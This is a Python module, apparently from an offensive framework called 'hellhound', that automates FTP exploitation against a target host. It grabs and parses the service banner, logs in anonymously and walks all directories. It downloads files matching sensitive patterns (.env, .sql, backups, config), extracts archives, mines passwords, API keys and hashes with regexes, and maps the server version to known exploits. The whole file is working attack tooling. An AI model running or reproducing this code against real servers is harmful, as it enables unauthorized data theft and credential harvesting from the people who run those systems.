import socket
import ftplib
import re
import os
import zipfile
from datetime import datetime
from hellhound.core.exploit_mapper import ExploitMapper

NAME = "ftp"
CATEGORY = "network"
DESCRIPTION = "Advanced FTP exploitation (Recursive + Auto Download + Credential Mining)"


class FTPModule:

    def __init__(self, target, emit):
        self.target = target
        self.emit = emit
        self.port = 21

        self.storage_path = self._prepare_storage()

        self.intel = {
            "service": "ftp",
            "banner": "",
            "product": "",
            "version": "",
            "anonymous_login": False,
            "files": [],
            "downloaded_files": [],
            "credentials_found": [],
            "hashes_found": [],
            "exploit_intel": {},
            "signals": []
        }

    # =================================================
    # Storage Setup
    # =================================================

    def _prepare_storage(self):
        base = os.path.abspath(
            os.path.join(os.path.dirname(__file__), "../../storage")
        )
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        folder = os.path.join(base, f"ftp_{self.target}_{timestamp}")
        os.makedirs(folder, exist_ok=True)
        return folder

    # =================================================
    # Banner Grab
    # =================================================

    def grab_banner(self):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            banner = s.recv(1024).decode(errors="ignore").strip()
            s.close()

            self.intel["banner"] = banner
            self._extract_version(banner)

        except Exception:
            self.emit.warn("FTP banner grab failed")

    def _extract_version(self, banner):

        patterns = [
            r"(vsftpd\s[\d\.]+)",
            r"(ProFTPD\s[\d\.]+)",
            r"(Pure-FTPd\s[\d\.]+)",
            r"(FileZilla\s[\d\.]+)"
        ]

        for pattern in patterns:
            match = re.search(pattern, banner, re.IGNORECASE)
            if match:
                parts = match.group(1).split()
                self.intel["product"] = parts[0]
                if len(parts) > 1:
                    self.intel["version"] = parts[1]
                return

    # =================================================
    # Anonymous Login
    # =================================================

    def check_anonymous(self):

        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=5)
            ftp.login("anonymous", "anonymous@")

            self.intel["anonymous_login"] = True
            self.intel["signals"].append("ANONYMOUS_LOGIN_ALLOWED")

            self.recursive_walk(ftp, "")
            ftp.quit()

        except Exception:
            self.intel["anonymous_login"] = False

    # =================================================
    # Recursive Directory Walk
    # =================================================

    def recursive_walk(self, ftp, current_path):

        try:
            ftp.cwd(current_path)
            items = ftp.nlst()

            for item in items:
                full_path = os.path.join(current_path, item)

                if self.is_directory(ftp, item):
                    self.recursive_walk(ftp, full_path)
                    ftp.cwd(current_path)
                else:
                    self.intel["files"].append(full_path)
                    self.handle_file(ftp, full_path)

        except Exception:
            return

    def is_directory(self, ftp, name):
        try:
            current = ftp.pwd()
            ftp.cwd(name)
            ftp.cwd(current)
            return True
        except:
            return False

    # =================================================
    # File Handling
    # =================================================

    def handle_file(self, ftp, remote_path):

        filename = os.path.basename(remote_path).lower()

        sensitive_patterns = [
            ".zip", ".bak", ".sql", ".env",
            "config", "backup", ".txt", ".php"
        ]

        if any(p in filename for p in sensitive_patterns):
            self.intel["signals"].append("SENSITIVE_FILE_EXPOSED")
            local_path = self.download_file(ftp, remote_path)

            if local_path:
                self.analyze_file(local_path)

    def download_file(self, ftp, remote_path):

        local_path = os.path.join(self.storage_path,
                                  remote_path.replace("/", "_"))

        try:
            with open(local_path, "wb") as f:
                ftp.retrbinary(f"RETR {remote_path}", f.write)

            self.intel["downloaded_files"].append(local_path)
            return local_path

        except Exception:
            return None

    # =================================================
    # File Analysis
    # =================================================

    def analyze_file(self, filepath):

        try:
            # Auto unzip
            if filepath.endswith(".zip"):
                with zipfile.ZipFile(filepath, "r") as zip_ref:
                    zip_ref.extractall(self.storage_path)
                    self.intel["signals"].append("ARCHIVE_EXTRACTED")

            with open(filepath, "r", errors="ignore") as f:
                content = f.read()

                self.extract_credentials(content)
                self.extract_hashes(content)

        except Exception:
            pass

    def extract_credentials(self, content):

        patterns = [
            r"password\s*=\s*['\"]?([^'\"\n]+)",
            r"db_pass\s*=\s*['\"]?([^'\"\n]+)",
            r"api_key\s*=\s*['\"]?([^'\"\n]+)"
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                self.intel["credentials_found"].append(match)
                self.intel["signals"].append("CREDENTIAL_DISCOVERED")

    def extract_hashes(self, content):

        hash_patterns = [
            r"\b[a-f0-9]{32}\b",
            r"\b[a-f0-9]{40}\b",
            r"\b[a-f0-9]{64}\b"
        ]

        for pattern in hash_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                self.intel["hashes_found"].append(match)
                self.intel["signals"].append("HASH_DISCOVERED")

    # =================================================
    # Exploit Intelligence
    # =================================================

    def map_exploits(self):

        if not self.intel["product"]:
            return

        mapper = ExploitMapper(self.emit)

        self.intel["exploit_intel"] = mapper.map_service(
            "ftp",
            self.intel["product"],
            self.intel["version"]
        )

    # =================================================
    # Run
    # =================================================

    def run(self):

        self.emit.info("Starting advanced FTP exploitation")

        self.grab_banner()
        self.check_anonymous()
        self.map_exploits()

        self.emit.success("FTP module complete")

        return {
            "raw": f"Files: {len(self.intel['files'])} | Downloads: {len(self.intel['downloaded_files'])}",
            "intel": self.intel
        }


# =================================================
# Framework Entry
# =================================================

def run(target, emit, options=None, stop_check=None, pause_check=None):

    module = FTPModule(target, emit)
    return module.run()
